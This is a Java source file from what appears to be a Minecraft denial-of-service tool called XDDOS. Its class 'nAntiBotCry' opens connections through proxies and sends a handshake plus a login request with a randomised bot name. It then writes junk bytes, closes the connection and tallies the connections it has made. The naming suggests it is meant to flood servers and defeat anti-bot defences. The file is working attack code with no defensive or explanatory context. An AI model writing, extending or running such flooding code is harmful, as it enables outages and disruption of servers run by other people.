package XD.XDDOS.methods.impl;

import XD.XDDOS.XDDOS;
import XD.XDDOS.methods.IMethod;
import XD.XDDOS.utils.NettyBootstrap;
import XD.XDDOS.utils.packet.Handshake;
import XD.XDDOS.utils.packet.LoginRequest;
import XD.XDDOS.utils.proxy.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.security.SecureRandom;

public class nAntiBotCry implements IMethod {
  private Handshake handshake = new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2);

  private byte[] bytes = this.handshake.getWrappedPacket();

  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    ByteBuf b = Unpooled.buffer();
    ByteBufOutputStream out = new ByteBufOutputStream(b);
    try {
      out.write(this.bytes);
      out.write((new LoginRequest((new SecureRandom()).nextInt(999999999)+"_XD")).getWrappedPacket());
      out.write(666);
      out.write(666);
      out.write(666);
      out.write(666);
      out.write(666);
      out.write(666);
      for (int i = 0; i < 100; i++) {
        out.write(666);
        out.write(1);
      }
    } catch (Exception exception) {}
    channel.writeAndFlush(b);
    channel.writeAndFlush(out);
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
    channel.close();
  }
}
